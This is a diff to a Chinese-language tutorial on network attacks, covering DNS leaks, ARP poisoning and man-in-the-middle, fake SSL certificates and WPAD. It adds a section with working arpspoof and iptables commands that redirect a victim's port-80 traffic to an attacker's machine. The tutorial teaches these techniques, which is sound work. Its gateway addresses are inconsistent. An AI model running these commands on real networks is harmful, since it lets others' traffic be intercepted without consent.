@@ -24,7 +24,8 @@ Windows客户端的解决办法:
     - 单层VPN不被视为隐匿上网。用户可以通过[dnsleaktest](https://www.dnsleaktest.com/)提供的在线检测是否存在DNS泄漏。
  
 - 解决方案2：隐匿上网
-    - 若对隐匿性有一定要求，不推荐使用单层VPN。为增强隐匿性和安全性，往往使用虚拟机+多层代理的组合。
+
+- 若对隐匿性有一定要求，不推荐使用单层VPN。为增强隐匿性和安全性，往往使用虚拟机+多层代理的组合。
     - 更多内容可参考编程随想博客《如何隐藏你的踪迹》
 - 解决方案3：使用DNSCrypt加密DNS传输   
     - DNSCrypt是OpenDNS发布的，旨在确保客户端与DNS服务器传输安全的工具，基于DNSCurve发展而来。
@@ -41,13 +42,13 @@ Windows客户端的解决办法:
 
 ##ARP欺骗与MITM
 
-示例：ARP投毒(双向)
+###URL流量操作 
 
 实际操作命令：
 
 1. 开启端口转发，（攻击者）允许本机像路由器那样转发数据包
 
-   *echo 1 > /proc/sys/net/ip4v/ip_forward*
+   *echo 1 > /proc/sys/net/ipv4/ip_forward*
 
 2. ARP投毒，向主机XP声称自己(攻击者)就是网关Ubuntu 
 
@@ -58,6 +59,31 @@ Windows客户端的解决办法:
     *arpspoof -i eth0 -t 10.23.2.5 10.23.2.4*
 
 Notification: 攻击者要“持续投毒”，因为一旦停止投毒，将发生“clean up and re-arping”，将发送正确的目的物理地址。  
+
+###端口重定向攻击
+
+端口重定向接收到一个端口数据包的过程（如80端口），并且重定向它的流量到不同的端口（如8080）。实现这类型攻击的好处就是可以无止境的，因为可以随着它重定向安全的端口到未加密端口，重定向流量到指定设备的一个特定端口上。
+
+具体操作步骤如下：
+
+1. 开启路由转发攻击。执行命令如下所示：
+
+    *echo 1 > /proc/sys/net/ipv4/ip_forward*
+
+2. 启动Arpspoof工具注入流量到默认网络。例如，默认网关地址为10.32.2.1。执行命令如下：
+
+    *arpspoof -i eth0 10.23.2.1*
+
+* 在Kali Linux上执行以上命令后，没有任何输出信息。
+
+3. 添加一条端口重定向的防火墙规则。执行命令如下所示：
+
+    *iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080*
+
+* 执行以上命令后，没有任何输出。
+
+以上设置成功后，当用户向网关10.23.2.1的80端口发送请求时，将会被转发为8080端口发送到攻击者主机上。
+
 
 ##伪造SSL证书
 
@@ -113,7 +139,7 @@ https握手过程的证书校验环节就是为了识别证书的有效性唯一
 
 The penetration testing framework Metasploit includes support for WPAD via a new auxiliary module located at "auxiliary/server/wpad". This module, which is written by Efrain Torres, can be used to perform for man-in-the-middle (MITM) attacks by exploiting the features of WPAD. 
 
- * 参考链接：[WPAD-Man-in-the-Middle](http://www.netresec.com/?page=Blog&month=2012-07&post=WPAD-Man-in-the-Middle)
+ * 参考链接：[WPAD Man in the Middle](http://www.netresec.com/?page=Blog&month=2012-07&post=WPAD-Man-in-the-Middle)
 
 2.Badtunnel
 
